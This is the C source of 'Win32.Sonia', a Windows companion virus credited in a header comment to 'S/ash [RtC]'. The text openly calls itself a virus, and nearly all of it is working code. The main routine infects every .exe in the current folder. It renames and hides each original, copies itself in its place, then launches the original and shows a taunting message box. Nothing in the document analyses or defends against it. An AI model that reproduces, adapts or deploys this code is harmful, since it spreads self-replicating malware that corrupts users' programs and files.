
/*
 * Win32.Sonia virus by S/ash [RtC]
 * The purpose of this virus is to fuck up the original version of Win32.Sonia :
 *     Do the same thing in C Win32 and make the executable smaller
 * It's a companion virus in Win32 using a C compilator
 * Borland C++ version 5.0a used here
 * A special external obj is made for WinMain : hehe i get 28Ko free :)
 * Well so source code are this file and mainlib.asm
 */

#define MAX_PATH 260
#define INVALID_HANDLE_VALUE ((HANDLE)-1)
#define FILE_ATTRIBUTE_HIDDEN 0x0002

/* I don't use include so i made my own definitions */
typedef void *HANDLE;
typedef struct {
  int dwLowDateTime;
  int dwHighDateTime;
} FILETIME;

typedef struct _WIN32_FIND_DATAA {
    int dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    int nFileSizeHigh;
    int nFileSizeLow;
    int dwReserved0;
    int dwReserved1;
    char   cFileName[ MAX_PATH ];
    char   cAlternateFileName[ 14 ];
} WIN32_FIND_DATA;

typedef int BOOL;
#define TRUE  1
#define FALSE 0

/* exports and imports */
void __export       __stdcall WinMain(void);
extern HANDLE       __stdcall FindFirstFileA(char*, WIN32_FIND_DATA*);
extern BOOL         __stdcall FindNextFileA(HANDLE, WIN32_FIND_DATA*);
extern BOOL         __stdcall MoveFileA(char*,char*);
extern BOOL         __stdcall CopyFileA(char*, char*, BOOL);
extern int          __stdcall GetFileAttributesA(char*);
extern BOOL         __stdcall SetFileAttributesA(char*, int);
extern unsigned int __stdcall WinExec(char*, unsigned int);
extern int          __stdcall MessageBoxA(HANDLE, char*, char*, unsigned int);
extern char*        __stdcall GetCommandLineA(void);
extern void         __stdcall ExitProcess(unsigned int);

/* The program */
char VIRUS_NAME[]    = "Win32.Sonia";
char VIRUS_VERSION[] = "C version with special lib";
char AUTHOR[]        = "S/ash [RtC]";
char VIRTITLE[]      = "Win32.Sonia";
char VIRTEXT[]       = "Have i fucked up Win32.Sonia ?";
char EXE_MASK[]      = "*.exe";

void __stdcall WinMain()
{
  HANDLE handle; int i,j; char newname[MAX_PATH+2];
  WIN32_FIND_DATA W32FD;
  char *deststr, *str;
  char *lpszCmdLine = GetCommandLineA();

  for(j=1; lpszCmdLine[j] && (lpszCmdLine[j] != '\"'); j++); /* Hehe, just a tips :) */
  lpszCmdLine[j] = 0;

  handle = FindFirstFileA(EXE_MASK, &W32FD);
  if(handle != INVALID_HANDLE_VALUE)
    do
    {
      // Infection routine
      deststr = newname; str = W32FD.cFileName;
      while(*str) { *deststr = *str; str++; deststr++;}
      *deststr = 0;
      *(deststr - 1) = '_';

      MoveFileA(W32FD.cFileName, newname);
      i = GetFileAttributesA(newname);
      SetFileAttributesA(newname, i | FILE_ATTRIBUTE_HIDDEN);
      CopyFileA(lpszCmdLine+1, W32FD.cFileName, 1);
      // Next File
    } while(FindNextFileA(handle, &W32FD));
  lpszCmdLine[j]   = '\"';
  lpszCmdLine[j-1] = '_';
  WinExec(lpszCmdLine, 1);
  MessageBoxA(0, VIRTEXT, VIRTITLE, 0x0040);
  ExitProcess(0);
}
